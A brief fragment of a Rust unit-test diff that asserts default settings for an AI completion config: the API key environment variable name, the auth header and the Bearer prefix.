+        assert_eq!(config.ai_completion.api_key_env, "OPENAI_API_KEY");
         assert_eq!(config.ai_completion.api_key_header, "Authorization");
         assert_eq!(config.ai_completion.api_key_prefix, Some("Bearer".to_string()));
     }
